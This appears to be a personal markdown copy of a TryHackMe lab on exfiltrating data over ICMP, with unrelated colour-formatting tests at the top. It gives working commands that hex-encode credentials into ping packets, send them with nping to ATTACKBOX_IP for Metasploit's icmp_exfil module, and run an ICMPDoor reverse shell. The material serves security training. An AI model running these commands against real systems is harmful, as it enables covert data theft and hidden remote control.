# Exfiltration using ICMP

````diff
- This is a line with red test
+ This is a line with *green text*
<span style="color: red;">This text is red.</span>
🚨 **Important**: Please read this carefully!
- `highlighted text`
- other red test
+ other green test
````
🔴🟢🟡                        
$${\color{green}&#9679;}$$  
$${\color{yellow}&#9679;}$$  
$${\color{red}&#9679;}$$  
$${\color{red}Red?}$$  
$${\color{green}Red?}$$  
$${\color{blue}Red?}$$  
${\color{orange}RedRed}$  
$`{\color{purple}blue-white}`$  
${\color{pink}blue-green}$  
${\color{white}blue-yellow}$  
${\color{green}\`blue-yellow``}$  
$`{\color{red} ping }`$  
$`{\color{red} ping }`$  

 $${\color{red}&#9679;}$$&nbsp;$${\color{green}&#9679;}$$&nbsp;$${\color{yellow}&#9679;}$$
 $${\color{red}&#9679}$$$$&nbsp;$$$${\color{green}&#9679}$$$$&nbsp;$$$${\color{yellow}&#9679}$$

$${\color{green}&#9679;}$$  
$${\color{yellow}&#9679;}$$  
$${\color{red}&#9679;}$$
$${\color{red}&#9679}$$$${\color{red}&#9679;}$$$${\color{red}&#9679;}$$


In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking) or visit: https://tryhackme.com/room/whatisnetworking. 

Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the $`{\color{red}`PING`}`$ command to send **`ICMP`** packets through the network, as shown in the figure below:

|![image](https://github.com/user-attachments/assets/a4cbaf82-22f5-42df-aa28-3b03d4666d31) |
|-------------------------------------|
| *ICMP Request and Reply Diagram* |

The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if **`HOST2`** is available, it sends an **`ICMP`** packet back with an **echo reply** message confirming the availability.  

  
## ICMP Data Section

On a high level, the **`ICMP`** packet's structure contains a **`Data`** section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the **`Data`** section, which is optional to use.<br>
| ![image](https://github.com/user-attachments/assets/4f8bf4a9-c0e7-4af1-83c1-50c60fa45e30) |
|-----------|
| *ICMP Packet Structure Diagram* |
  
Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the **`Data`** section and send it via **`ICMP`** packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.  

To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:

```bash
🔴🟢🟡                        #Sending one ICMP packet using the PING Command:
thm@AttackBox$ ping 10.10.144.103 -c 1
```
  
We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:  

| ![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d) |
|-----------|
| *Showing the Data Field value in Wireshark Diagram* |
  
The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 

The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. **Note that the **`-p`** option is only available for Linux operating systems**. We can confirm that by checking the ping's help manual page.

| ![image](https://github.com/user-attachments/assets/21cd4be2-a81f-4793-b0f9-13489c271214) |
|-----------|
| *Ping's -p argument Screenshot* |
  
Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,

```bash
🔴🟢🟡                        #Using the xxd command to convert text to Hex:
root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a
```

  
We used the **`xxd`** command to convert our string to Hex, and then we can use the **`ping`** command with the Hex value we got from converting the **`thm:tryhackme`**.

```bash
🔴🟢🟡                        #Send Hex using the ping command:
root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
```

##### :star: :star: :star: **or for a one-liner:** :star: :star: :star:
```bash
ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
```
  
We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.

| ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94) |
|-----------|
| *Checking Data Field in Wireshark Screenshot* |

:tada: Excellent! :tada: We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command. :rocket:

  
## ICMP Data Exfiltration

Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a **`Beginning of File (BOF)`** trigger value. Once it is received, it writes to the disk until it gets an **`End of File (EOF)`** trigger value. The following diagram shows the required steps for the **Metasploit** framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.

| ![image](https://github.com/user-attachments/assets/84f53917-1a90-4917-8f9c-913263876bd5) |
|-----------|
| *ICMP Data Exfiltration Diagram* |
  
  
Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the <red>**`BPF_FILTER`**</red> option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:

```bash
🔴🟢🟡                        #Set the BPF_FILTER in MSF:
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP
```

We also need to select which network interface to listen to, **`eth0`**. Finally, <red>executes</red> run to start the module.

```bash
🔴🟢🟡                        #Set the interface in MSF
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```
  
We prepared `icmp.thm.com` as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the `icmp.thm.com` using `thm:tryhackme` credentials.

We have preinstalled the **`nping`** tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools. [Link here](https://nmap.org/nping/) or visit: https://nmap.org/nping/

First, we will send the **`BOF trigger`** from the ICMP machine so that the Metasploit framework starts writing to the disk. 

```bash
🔴🟢🟡                        #Sending the Trigger Value from the Victim
thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
    
Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```

We sent one ICMP packet using the **`nping`*** command with **`--data-string`** argument. We specify the trigger value with the file name **`BOFfile.txt`**, set by default in the Metasploit framework. This could be changed from Metasploit if needed!  

Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk. 

Let's start sending the required data and the end of the file trigger value from the ICMP machine.

```bash
🔴🟢🟡                        #Sending the Data and the End of the File Trigger Value
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
    
Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
    
Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
    
Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#
```
Let's check our AttackBox once we have done sending the data and the ending trigger value.

```bash
🔴🟢🟡                        #Receiving Data in MSF
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
```

:tada: Nice! :tada: We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the 💰 loot file mentioned in the terminal to confirm the received data.

## ICMP C2 Communication

Next, we will show executing commands over the $${\color{red}ICMP}$$ protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) or at https://github.com/krabelize/icmpdoor tool. $${\color{red}ICMPDoor}$$ is an open-source reverse-shell written in **`Python3`** and **`scapy`**. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.

| ![image](https://github.com/user-attachments/assets/9aeb810c-9cae-4a25-a33c-25fcf6cd556c) |
|-----------|
| *C2 Communication over ICMP Diagram* |


We have prepared the tools needed for C2 communication over the ICMP protocol on JumpBox and the ICMP-Host machines. First, we need to log in to the ICMP machine, icmp.thm.com, and execute the icmpdoor binary as follows,

```bash
🔴🟢🟡                        #Run the icmpdoor command on the ICMP-Host Machine
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

Note that we specify the interface to communicate over and the destination IP of the server-side.

Next, log in to the JumpBox and execute the $${\color{red}icmp-cnc}$$ binary to communicate with the victim, our **`ICMP-Host`**. Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine. 

```bash
🔴🟢🟡                        #The data that needs to be transferred
thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host
```

Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the **`hostname`** command, and we received **`icmp-host`**.

To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:
| ![image](https://github.com/user-attachments/assets/f66df225-582f-41c5-81f6-0a575ddd6583) |
|-----------|
| *Capture ICMP traffic using tcpdump Diagram* |

🎉*`End of Session`*🎉
